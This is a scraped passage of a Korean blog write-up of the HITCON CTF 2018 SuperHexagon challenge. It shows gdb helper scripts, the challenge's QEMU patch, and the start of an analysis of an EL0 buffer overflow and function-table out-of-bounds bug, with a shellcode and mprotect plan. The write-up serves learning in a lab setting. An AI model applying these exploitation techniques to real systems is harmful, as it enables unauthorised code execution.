'EL3h' # SP_EL3 else: re += 'UNK' else: if 0b0000 == mode: re += 'User' elif 0b0001 == mode: re += 'FIQ' elif 0b0010 == mode: re += 'IRQ' elif 0b0011 == mode: re += 'Supervisor' elif 0b0110 == mode: re += 'Monitor' elif 0b0111 == mode: re += 'Abort' elif 0b1010 == mode: re += 'Hyp' elif 0b1011 == mode: re += 'Undefined' elif 0b1111 == mode: re += 'System' else: re += 'UNK' re += ' | ' if IRQ: re += 'IRQ_MASKED | ' elif FIQ: re += 'FIQ_MASKED | ' if is_thumb: re += 'THUMB_MODE | ' if state: re += '32-BIT | ' else: re += '64-BIT | ' re += f'COND_{hex(cond)[2:]}' print(re) class SPSR_EL3(gdb.Command): def __init__(self): super(SPSR_EL3, self).__init__(\"spsr_el3\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): spsr = (int(gdb.parse_and_eval(\"$SPSR_EL3\"))) mode = spsr \u0026 0b1111 is_thumb = (spsr \u003e\u003e 4)\u00261 IRQ = (spsr \u003e\u003e 7)\u00261 FIQ = (spsr \u003e\u003e 6)\u00261 cond = (spsr \u003e\u003e 27)\u00260b11111 state = (spsr \u003e\u003e 4)\u00261 re = '' if not state: if 0b0000 == mode: re += 'EL0t' # SP_EL0 elif 0b0100 == mode: re += 'EL1t' # SP_EL0 elif 0b0101 == mode: re += 'EL1h' # SP_EL1 elif 0b1000 == mode: re += 'EL2t' # SP_EL0 elif 0b1001 == mode: re += 'EL2h' # SP_EL2 elif 0b1100 == mode: re += 'EL3t' # SP_EL0 elif 0b1101 == mode: re += 'EL3h' # SP_EL3 else: re += 'UNK' else: if 0b0000 == mode: re += 'User' elif 0b0001 == mode: re += 'FIQ' elif 0b0010 == mode: re += 'IRQ' elif 0b0011 == mode: re += 'Supervisor' elif 0b0110 == mode: re += 'Monitor' elif 0b0111 == mode: re += 'Abort' elif 0b1010 == mode: re += 'Hyp' elif 0b1011 == mode: re += 'Undefined' elif 0b1111 == mode: re += 'System' else: re += 'UNK' re += ' | ' if IRQ: re += 'IRQ_MASKED | ' elif FIQ: re += 'FIQ_MASKED | ' if is_thumb: re += 'THUMB_MODE | ' if state: re += '32-BIT | ' else: re += '64-BIT | ' re += f'COND_{hex(cond)[2:]}' print(re) class TCR_EL1(gdb.Command): def __init__(self): super(TCR_EL1, self).__init__(\"tcr_el1\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): arg = arg.split() if len(arg) == 1: tcr = int(arg[0],16) elif len(arg) == 0: tcr = int(gdb.parse_and_eval('$TCR_EL1')) else: print(\"usuage: tcr_el1 [value (optional)]\") return T0SZ = tcr \u00260b111111 T1SZ = tcr \u003e\u003e 16 T1SZ \u0026= 0b111111 TG1 = int((tcr\u003e\u003e 30) \u0026 0b11) granule_bits = {0b01: 14, 0b10: 12, 0b11: 16}[TG1] print(\"T0:\",hex(0),'~',hex(2 ** (64-T0SZ)-1)) print(\"T1:\",hex(0x10000000000000000 - 2 ** (64-T1SZ)),'~',hex(0xffffffffffffffff)) print('granule_bits:',granule_bits) class QEMU_SUPPORT(gdb.Command): address_space = { 'cpu-memory-0':{ 'system' : { 'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff}, 'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff}, 'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff}, } }, 'cpu-secure-memory-0': { 'hitcon.flash0' : {'start' : 0x0000000000000000, 'end' : 0x0000000003ffffff}, 'system' : { 'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff}, 'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff}, 'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff}, }, 'hitcon.secure-ram' : {'start' : 0x000000000e000000, 'end' : 0x000000000effffff} } } # monitor info mtree @staticmethod def get_remote_pid(proc_name): pids = [] for process in psutil.process_iter(): if proc_name in process.name(): pids.append(process.pid) if len(pids) != 1: return False return pids[0] def __init__(self): super(QEMU_SUPPORT, self).__init__(\"qemu_support\", gdb.COMMAND_USER) pid = self.get_remote_pid('qemu-system-aarch64') if pid != False: self.pid = pid def read_memory(self, addr, length): gdb.selected_inferior().read_memory(addr, length).tobytes() def find_region_recursive(self, addr): def find_region_step(obj, key): assert type(obj) == type({}) if 'start' in obj and 'end' in obj: if addr \u003e= obj['start'] and addr \u003c= obj['end']: return key else: return False else: for i in obj: if find_region_step(obj[i], i) != False: return i return False return (find_region_step(QEMU_SUPPORT.address_space, '')) def read_phys(self, addr, length): def slow_path(): ret = gdb.execute(f\"monitor gpa2hva {addr}\", to_string=True) r = re.search(\"is (0x[0-9a-f]+)\", ret) if r: host_va = int(r.group(1),16) with open(f'/proc/{self.pid}/mem','rb') as f: f.seek(host_va) data = f.read(length) return data else: print('Err read_phys() -\u003e slow_path()') def fast_path(): gdb.execute(f'monitor xp/{length//8}xg {addr}') return True reg = self.find_region_recursive(addr) # secure mem or non-secure? if reg == 'cpu-secure-memory-0': return slow_path() elif reg == 'cpu-memory-0': return fast_path() else: print(\"Err find_region_recursive()\",reg) return # secure world can access non-secure mem as well as secure mem. def invoke(self, arg, from_tty): arg = arg.split() if len(arg) \u003e 0: if arg[0] == 'read_phys': if len(arg) \u003e 2: if arg[1].startswith('0x'): addr = int(arg[1],16) else: addr = int(arg[1],10) if arg[2].startswith('0x'): length = int(arg[2],16) else: length = int(arg[2],10) data = self.read_phys(addr, length*8) if data != True: self.qword_dump(data, addr,length) else: print(\"invalid args\") @staticmethod def qword_dump(data, addr, length): for i in range(length): if i%2==0: ad = hex(addr + i*0x8)[2:].rjust(16,'0') print(f'{ad}',end=': ') a = hex(struct.unpack(\"",
  "wordCount" : "8493",
  "inLanguage": "en",
  "datePublished": "2024-06-25T00:00:00Z",
  "dateModified": "2024-06-25T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/hitcon_2018_superhexagon/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      HITCON CTF 2018 - SuperHexagon
    </h1>
    <div class="post-meta">


June 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#hitcon-2018-superhexagon" aria-label="HITCON 2018 SuperHexagon">HITCON 2018 SuperHexagon</a><ul>
                        
                <li>
                    <a href="#overview-1" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#el0-non-secure-application" aria-label="EL0, Non-secure application">EL0, Non-secure application</a><ul>
                        
                <li>
                    <a href="#el0-elf-binary" aria-label="EL0, ELF binary">EL0, ELF binary</a></li>
                <li>
                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a><ul>
                        
                <li>
                    <a href="#code-execution" aria-label="Code execution">Code execution</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#reverse-engineering-bootloader" aria-label="Reverse engineering bootloader">Reverse engineering bootloader</a><ul>
                        
                <li>
                    <a href="#cpsr-structure--gdbscript" aria-label="CPSR structure &amp;amp; gdbscript">CPSR structure &amp; gdbscript</a></li>
                <li>
                    <a href="#sctlr_elx-structure" aria-label="SCTLR_ELx structure">SCTLR_ELx structure</a></li></ul>
                </li>
                <li>
                    <a href="#identifying-exception-handlers" aria-label="Identifying exception handlers">Identifying exception handlers</a><ul>
                        
                <li>
                    <a href="#vbar_elx-structure" aria-label="VBAR_ELx structure">VBAR_ELx structure</a></li>
                <li>
                    <a href="#exception-vector-structure" aria-label="Exception vector structure">Exception vector structure</a></li>
                <li>
                    <a href="#extracting-el1-s-el1-el2-binaries" aria-label="Extracting EL1, S-EL1, EL2 binaries">Extracting EL1, S-EL1, EL2 binaries</a><ul>
                        
                <li>
                    <a href="#tcr_elx-structure--gdbscript" aria-label="TCR_ELx structure &amp;amp; gdbscript">TCR_ELx structure &amp; gdbscript</a></li></ul>
                </li>
                <li>
                    <a href="#accessing-secure-memory--gdbscript" aria-label="Accessing secure memory &amp;amp; gdbscript">Accessing secure memory &amp; gdbscript</a></li></ul>
                </li>
                <li>
                    <a href="#el1-non-secure-kernel" aria-label="EL1, Non-secure Kernel">EL1, Non-secure Kernel</a><ul>
                        
                <li>
                    <a href="#vulnerability-1" aria-label="Vulnerability">Vulnerability</a></li>
                <li>
                    <a href="#gaining-code-execution" aria-label="Gaining code execution">Gaining code execution</a></li></ul>
                </li>
                <li>
                    <a href="#el2-virtual-machine-monitor" aria-label="EL2, Virtual machine monitor">EL2, Virtual machine monitor</a><ul>
                        
                <li>
                    <a href="#vulnerability-2" aria-label="Vulnerability">Vulnerability</a></li></ul>
                </li>
                <li>
                    <a href="#exploring-the-secure-world" aria-label="Exploring the Secure world">Exploring the Secure world</a><ul>
                        
                <li>
                    <a href="#analyzing-the-secure-monitor" aria-label="Analyzing the secure monitor">Analyzing the secure monitor</a></li>
                <li>
                    <a href="#analyzing-the-interaction-between-the-normal-world-and-the-secure-world" aria-label="Analyzing the Interaction Between the Normal World and the Secure World">Analyzing the Interaction Between the Normal World and the Secure World</a><ul>
                        
                <li>
                    <a href="#el0" aria-label="EL0">EL0</a></li>
                <li>
                    <a href="#el1" aria-label="EL1">EL1</a></li>
                <li>
                    <a href="#el2" aria-label="EL2">EL2</a></li>
                <li>
                    <a href="#s-el3" aria-label="S-EL3">S-EL3</a></li>
                <li>
                    <a href="#spsr_el3-structure--gdbscript" aria-label="SPSR_EL3 structure &amp;amp; gdbscript">SPSR_EL3 structure &amp; gdbscript</a></li>
                <li>
                    <a href="#bootloader" aria-label="bootloader">bootloader</a></li>
                <li>
                    <a href="#secure-world-pagewalk-gdbscript" aria-label="Secure world pagewalk gdbscript">Secure world pagewalk gdbscript</a></li></ul>
                </li>
                <li>
                    <a href="#reverse-engineering-s-el1" aria-label="Reverse engineering S-EL1">Reverse engineering S-EL1</a><ul>
                        
                <li>
                    <a href="#reversing-the-binary-loader--s-el0-binary-extraction" aria-label="Reversing the binary loader &amp;amp; S-EL0 binary extraction">Reversing the binary loader &amp; S-EL0 binary extraction</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#s-el0-secure-application" aria-label="S-EL0, Secure application">S-EL0, Secure application</a><ul>
                        
                <li>
                    <a href="#vulnerability-3" aria-label="Vulnerability">Vulnerability</a></li></ul>
                </li>
                <li>
                    <a href="#s-el1-secure-kernel" aria-label="S-EL1, Secure kernel">S-EL1, Secure kernel</a><ul>
                        
                <li>
                    <a href="#vulnerability-1---permission-bug" aria-label="Vulnerability 1 - Permission bug">Vulnerability 1 - Permission bug</a></li>
                <li>
                    <a href="#vulnerability-2---file-upload-dos" aria-label="Vulnerability 2 - file upload DOS">Vulnerability 2 - file upload DOS</a></li>
                <li>
                    <a href="#vulnerability-3---signal-handler" aria-label="Vulnerability 3 - signal handler">Vulnerability 3 - signal handler</a></li>
                <li>
                    <a href="#gaining-code-execution-1" aria-label="Gaining code execution">Gaining code execution</a></li>
                <li>
                    <a href="#enhancing-the-exploitation-stability" aria-label="Enhancing the exploitation stability">Enhancing the exploitation stability</a></li></ul>
                </li>
                <li>
                    <a href="#s-el3-secure-monitor" aria-label="S-EL3, Secure monitor">S-EL3, Secure monitor</a><ul>
                        
                <li>
                    <a href="#vulnerability-4" aria-label="Vulnerability">Vulnerability</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#appendix" aria-label="Appendix">Appendix</a><ul>
                        
                <li>
                    <a href="#gdbscript" aria-label="Gdbscript">Gdbscript</a></li>
                <li>
                    <a href="#exploit-code-s-sel3" aria-label="Exploit code (S-SEL3)">Exploit code (S-SEL3)</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>오랜만에 한꺼번에 블로그 글을 쓰게 되었다.<br>
이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.<br>
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.<br>
익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.</p>
<h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
<h1 id="hitcon-2018-superhexagon">HITCON 2018 SuperHexagon<a hidden class="anchor" aria-hidden="true" href="#hitcon-2018-superhexagon">#</a></h1>
<h2 id="overview-1">Overview<a hidden class="anchor" aria-hidden="true" href="#overview-1">#</a></h2>
<p>qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.<br>
이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    ARMCPRegInfo hitcon_flag_reginfo[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FLAG_WORD_0&#34;</span>, .state <span style="color:#f92672">=</span> ARM_CP_STATE_BOTH,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .opc0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .opc1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>, .crn <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>, .crm <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, .opc2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .access <span style="color:#f92672">=</span> PL0_RW,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>          .readfn <span style="color:#f92672">=</span> hitcon_flag_word_0_read, .writefn <span style="color:#f92672">=</span> arm_cp_write_ignore },
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> ARMCPUInfo {
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>initfn)(Object <span style="color:#f92672">*</span>obj);
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">266</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">387</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cortex-a57&#34;</span>,         .initfn <span style="color:#f92672">=</span> aarch64_a57_initfn },
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cortex-a53&#34;</span>,         .initfn <span style="color:#f92672">=</span> aarch64_a53_initfn },
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;max&#34;</span>,                .initfn <span style="color:#f92672">=</span> aarch64_max_initfn },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    { .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hitcon&#34;</span>,             .initfn <span style="color:#f92672">=</span> aarch64_hitcon_initfn },
</span></span><span style="display:flex;"><span>     { .name <span style="color:#f92672">=</span> NULL }
</span></span><span style="display:flex;"><span> };
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>미리 정의된 시스템 레지스터를 읽어서 flag를 읽을 수 있다.<br>
EL 마다 따로 리턴되는 flag가 다르다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span>  Flags have to be read from <span style="color:#ae81ff">8</span> sysregs: s3_3_c15_c12_0 <span style="color:#f92672">~</span> s3_3_c15_c12_7
</span></span><span style="display:flex;"><span>    For example, in aarch64, you may use:
</span></span><span style="display:flex;"><span>            mrs x0, s3_3_c15_c12_0
</span></span><span style="display:flex;"><span>            mrs x1, s3_3_c15_c12_1
</span></span><span style="display:flex;"><span>                             .
</span></span><span style="display:flex;"><span>                             .
</span></span><span style="display:flex;"><span>                             .
</span></span><span style="display:flex;"><span>            mrs x7, s3_3_c15_c12_7
</span></span><span style="display:flex;"><span>    For first two stages, EL0 and EL1, <span style="color:#960050;background-color:#1e0010">`</span>print_flag<span style="color:#960050;background-color:#1e0010">&#39;</span> functions are included.
</span></span><span style="display:flex;"><span>    Make good use of them.
</span></span><span style="display:flex;"><span>    qemu<span style="color:#f92672">-</span>system<span style="color:#f92672">-</span>aarch64, based on qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span>, is also patched to support this
</span></span><span style="display:flex;"><span>    feature. See <span style="color:#960050;background-color:#1e0010">`</span>qemu.patch<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> more details.
</span></span></code></pre></div><p>README에서 어떤식으로 flag를 얻을 수 있는지 나와있다.<br>
편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.</p>
<h2 id="el0-non-secure-application">EL0, Non-secure application<a hidden class="anchor" aria-hidden="true" href="#el0-non-secure-application">#</a></h2>
<h3 id="el0-elf-binary">EL0, ELF binary<a hidden class="anchor" aria-hidden="true" href="#el0-elf-binary">#</a></h3>
<p>bios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했고 이를 그대로 추출했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">load_trustlet</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>base,<span style="color:#66d9ef">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  __dest <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,__len,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_register_wsm</span>(__dest,__len);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(__dest,base,(<span style="color:#66d9ef">long</span>)size);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_init_trustlet</span>(iVar1,size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    pTVar3 <span style="color:#f92672">=</span> (TCI <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_register_wsm</span>(pTVar3,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다.<br>
알려지지 않은 svc 번호를 이용한다.<br>
TA_Bin은 arm32 thumb mode S-EL0 커스텀 바이너리로 보인다.<br>
그리고 tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출해서 secure world쪽으로 key를 넘기는 로직이 구현되어있다.</p>
<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">scanf</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__format,...)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> in_x5;
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> in_x6;
</span></span><span style="display:flex;"><span>  local_8 <span style="color:#f92672">=</span> in_x7;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(input);
</span></span><span style="display:flex;"><span>  local_100 <span style="color:#f92672">=</span> ap.__stack;
</span></span><span style="display:flex;"><span>  pvStack_f8 <span style="color:#f92672">=</span> ap.__gr_top;
</span></span><span style="display:flex;"><span>  uStack_e8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CONCAT44</span>(ap.__vr_offs,ap.__gr_offs);
</span></span><span style="display:flex;"><span>  local_f0 <span style="color:#f92672">=</span> ap.__vr_top;
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vsscanf</span>(input,__format,<span style="color:#f92672">&amp;</span>local_100);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>취약점은 단순 bof와 cmdtb에 대한 oob 였다.<br>
print_flag 함수가 이미 있으니 그 함수로 뛰면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Flag</span> (EL0)<span style="color:#f92672">:</span> hitcon{this is flag <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> EL0}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmd<span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span> 
</span></span></code></pre></div><h4 id="code-execution">Code execution<a hidden class="anchor" aria-hidden="true" href="#code-execution">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>(<span style="color:#f92672">*</span>cmdtb[cmd])(buf,idx,len);
</span></span></code></pre></div><p>len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.<br>
mprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2에서 항상 w^x를 보장하기에 불가능하다.<br>
그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.</p>
<h2 id="reverse-engineering-bootloader">Reverse engineering bootloader<a hidden class="anchor" aria-hidden="true" href="#reverse-engineering-bootloader">#</a></h2>
<p>부팅 초기에는 항상 최고 권한에서 시작하기에 무결성이 보장되어야한다고 생각했는데 실제로 나중에 익스플로잇을 다 끝내고 보니까 애초에 S-EL3의 경우엔 메모리에 올라오지 않고 flash rom 위에서 돌았다.</p>
<p>처음엔 부트로더쪽 배경지식이 없었기에 직접 qemu 코드를 읽어보면서 분석을 시작했다.<br>
cpu는 처음에 reset을 수행하는데 이는 arm_load_kernel에서 볼 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span> 	hwaddr flashsize <span style="color:#f92672">=</span> memmap[VIRT_FLASH].size <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    hwaddr flashbase <span style="color:#f92672">=</span> memmap[VIRT_FLASH].base;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#e6db74">&#34;hitcon.flash0&#34;</span>, flashbase, flashsize, bios_name, secure_sysmem);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#e6db74">&#34;hitcon.flash1&#34;</span>, flashbase <span style="color:#f92672">+</span> flashsize, flashsize, NULL, sysmem);
</span></span></code></pre></div><p>여기서 memmap[VIRT_FLASH].base는 0이고 bios.bin을 여기에 로드한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">arm_load_kernel</span>(ARMCPU <span style="color:#f92672">*</span>cpu, MachineState <span style="color:#f92672">*</span>ms, <span style="color:#66d9ef">struct</span> arm_boot_info <span style="color:#f92672">*</span>info)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (cs <span style="color:#f92672">=</span> first_cpu; cs; cs <span style="color:#f92672">=</span> <span style="color:#a6e22e">CPU_NEXT</span>(cs)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">qemu_register_reset</span>(do_cpu_reset, <span style="color:#a6e22e">ARM_CPU</span>(cs));
</span></span><span style="display:flex;"><span>        nb_cpus<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Load the kernel.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>info<span style="color:#f92672">-&gt;</span>kernel_filename <span style="color:#f92672">||</span> info<span style="color:#f92672">-&gt;</span>firmware_loaded) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arm_setup_firmware_boot</span>(cpu, info);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
